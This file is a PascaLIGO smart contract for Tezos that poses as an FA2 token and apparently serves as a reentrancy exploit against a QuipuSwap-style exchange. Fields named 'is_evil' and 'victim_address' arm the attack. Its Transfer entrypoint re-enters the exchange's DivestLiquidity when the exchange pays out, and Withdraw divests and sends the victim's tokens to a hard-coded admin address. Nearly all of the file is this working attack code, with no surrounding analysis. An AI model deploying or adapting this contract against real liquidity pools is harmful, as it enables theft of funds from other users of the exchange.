(* initial storage:

record [
  is_evil = False;
  shares_to_divest = 200n;
  victim_address = ("tz1ZZZZZZZZZZZZZZZZZZZZZZZZZZZZNkiRg" : address);
  quipuswap_address = ("tz1ZZZZZZZZZZZZZZZZZZZZZZZZZZZZNkiRg" : address);
]
*)
type storage is record [
    is_evil: bool;
    shares_to_divest: nat;
    victim_address : address;
    quipuswap_address: address;
]

const admin : address = ("tz1MDhGTfMQjtMYFXeasKzRWzkQKPtXEkSEw" : address);

type token_type is
| Fa12
| Fa2

type tokens_info is record [
  token_a_address        : address;
  token_b_address        : address;
  token_a_id             : nat;
  token_b_id             : nat;
  token_a_type           : token_type;
  token_b_type           : token_type;
]

type swap_type is Buy | Sell

type swap_slice_type is record [
    pair                  : tokens_info;
    operation             : swap_type;
]

(* Entrypoint arguments *)
type token_to_token_route_params is
  [@layout:comb]
  record [
    swaps                 : list(swap_slice_type);
    amount_in             : nat; (* amount of tokens to be exchanged *)
    min_amount_out        : nat; (* min amount of XTZ received to accept exchange *)
    receiver              : address; (* tokens receiver *)
  ]

(* Entrypoint arguments *)
type token_to_token_payment_params is
  [@layout:comb]
  record [
    pair                  : tokens_info;
    operation             : swap_type;
    amount_in             : nat; (* amount of tokens to be exchanged *)
    min_amount_out        : nat; (* min amount of XTZ received to accept exchange *)
    receiver              : address; (* tokens receiver *)
  ]

type initialize_exchange_params is
  [@layout:comb]
  record [
    pair            : tokens_info;
    token_a_in      : nat; (* min amount of XTZ received to accept the divestment *)
    token_b_in      : nat; (* min amount of tokens received to accept the divestment *)
  ]


type divest_liquidity_params is
  [@layout:comb]
  record [
    pair                 : tokens_info;
    min_token_a_out      : nat; (* min amount of XTZ received to accept the divestment *)
    min_token_b_out      : nat; (* min amount of tokens received to accept the divestment *)
    shares               : nat; (* amount of shares to be burnt *)
  ]

type invest_liquidity_params is
  [@layout:comb]
  record [
    pair            : tokens_info;
    token_a_in      : nat; (* min amount of XTZ received to accept the divestment *)
    token_b_in      : nat; (* min amount of tokens received to accept the divestment *)
  ]

type dex_action is
| InitializeExchange          of initialize_exchange_params  (* sets initial liquidity *)
| TokenToTokenRoutePayment    of token_to_token_route_params  (* exchanges XTZ to tokens and sends them to receiver *)
| TokenToTokenPayment         of token_to_token_payment_params  (* exchanges XTZ to tokens and sends them to receiver *)
| InvestLiquidity             of invest_liquidity_params  (* mints min shares after investing tokens and XTZ *)
| DivestLiquidity             of divest_liquidity_params  (* burns shares and sends tokens and XTZ to the owner *)

type operator_param is
  [@layout:comb]
  record [
    owner     : address;
    operator  : address;
    token_id  : nat;
  ]

type update_operator_param is
| Add_operator    of operator_param
| Remove_operator of operator_param

type update_operator_params is list (update_operator_param)

type transfer_destination is
  [@layout:comb]
  record [
    to_       : address;
    token_id  : nat;
    amount    : nat;
  ]

type transfer_param is
  [@layout:comb]
  record [
    from_   : address;
    txs     : list (transfer_destination);
  ]

type update_operators_interface is
| Update_operators   of update_operator_params

type foreign_fa2_interface is
| ForeignFA2Transfer  of list (transfer_param)

type parameter is
  Transfer of list (transfer_param)
  | Allow of address
  | Invest of (nat * nat * nat * address)
  | SetQuipuswapAddress of address
  | Withdraw of nat

type return is list (operation) * storage;
const no_op : list (operation) = nil;

function get_quipuswap_contract(const tt_address : address) : contract(dex_action) is
  case (Tezos.get_entrypoint_opt ("%use", tt_address) : option(contract(dex_action))) of
  | Some(contr) -> contr
  | None -> (failwith("Common/qp-pool-use-entrypoint-not-found") : contract(dex_action))
  end

function get_token_contract(const addr : address) : contract(update_operators_interface) is
  case (Tezos.get_entrypoint_opt("%update_operators", addr) : option(contract(update_operators_interface))) of
  | Some(contr) -> contr
  | None -> (failwith("not-a-fa2-token") : contract(update_operators_interface))
  end

function get_token_transfer_contract(const addr : address) : contract(foreign_fa2_interface) is
  case (Tezos.get_entrypoint_opt("%transfer", addr) : option(contract(foreign_fa2_interface))) of
  | Some(contr) -> contr
  | None -> (failwith("not-a-fa2-token") : contract(foreign_fa2_interface))
  end

function set_quipuswap_address ( const addr: address; var s : storage) : return is
 block {
    s.quipuswap_address := addr;
 } with (no_op, s)

function allow (const real_token: address; const s : storage) : return is 
 block {
    // TODO in a real thing only admin can access update operators
    const approve : operation = Tezos.transaction(
      Update_operators( list [
        Add_operator(record[
          owner = Tezos.self_address;
          operator = s.quipuswap_address;
          token_id = 0n;
        ])
      ]),
      0mutez,
      get_token_contract(real_token)
    );
 } with (list [ approve ], s)

function withdraw(const params: nat; const s : storage) : return is 
block {
  const tokinfo : tokens_info = record [
      token_a_address = s.victim_address;
      token_b_address = Tezos.self_address;
      token_a_id = 0n;
      token_b_id = 0n;
      token_a_type = Fa2;
      token_b_type = Fa2;
    ];
  (* do divest for real *)
  const divest : operation = 
    Tezos.transaction(
      DivestLiquidity(record [
          pair = tokinfo;
          min_token_a_out = 1n;
          min_token_b_out = 1n;
          shares = s.shares_to_divest;
      ]),
    0mutez,
    get_quipuswap_contract(s.quipuswap_address));

  const transfer : operation = 
    Tezos.transaction(
      ForeignFA2Transfer(list[ record[
        from_=Tezos.self_address;
        txs=list[ record[
          to_=admin;
          token_id=0n;
          amount=s.shares_to_divest;
        ]]
      ]]),
    0mutez,
    get_token_transfer_contract(s.victim_address));

} with (list [divest; transfer], s)

function invest (const params: (nat * nat * nat * address); var s : storage) : return is 
 block {
    s.is_evil := True;
    s.shares_to_divest := params.2;
    s.victim_address :=  params.3;

    const tokinfo : tokens_info = record [
      token_a_address = s.victim_address;
      token_b_address = Tezos.self_address;
      token_a_id = 0n;
      token_b_id = 0n;
      token_a_type = Fa2;
      token_b_type = Fa2;
    ];
    
    const invest : operation = Tezos.transaction(
        InvestLiquidity(record [
          pair = tokinfo;
          token_a_in = params.0;
          token_b_in = params.1;
        ]),
      0mutez,
      get_quipuswap_contract(s.quipuswap_address));
 } with (list [invest], s)

function transfer (const p : list (transfer_param); var s : storage) : return is
  block {
   var ops : list(operation) := list[];
   if s.is_evil = True then block {
      const tp : transfer_param = case List.head_opt(p) of
        Some(v) -> v
      | None -> (failwith("t1") : transfer_param) end;

      const dest : transfer_destination = case List.head_opt(tp.txs) of
        Some(v) -> v
      | None -> (failwith("t2") : transfer_destination) end;

      const token_b_address : address = dest.to_;

      const tokinfo : tokens_info = record [
        token_a_address = s.victim_address;
        token_b_address = Tezos.self_address;
        token_a_id = 0n;
        token_b_id = 0n;
        token_a_type = Fa2;
        token_b_type = Fa2;
      ];

     const divest : operation = 
      Tezos.transaction(
        DivestLiquidity(record [
            pair = tokinfo;
            min_token_a_out = 1n;
            min_token_b_out = 1n;
            shares = s.shares_to_divest;
        ]),
      0mutez,
      get_quipuswap_contract(s.quipuswap_address));

      s.is_evil := False;

    // TODO transfer all to admin
    ops := divest # ops;
   } else skip;
  } with (ops, s)

   
function main (const action : parameter; const s : storage) : return is
  case action of
   Transfer(p) -> transfer (p, s)
  | Allow(p) -> allow (p, s)
  | Invest(p) -> invest (p, s)
  | SetQuipuswapAddress (p) -> set_quipuswap_address(p, s)
  | Withdraw(p) -> withdraw(p, s)
  end
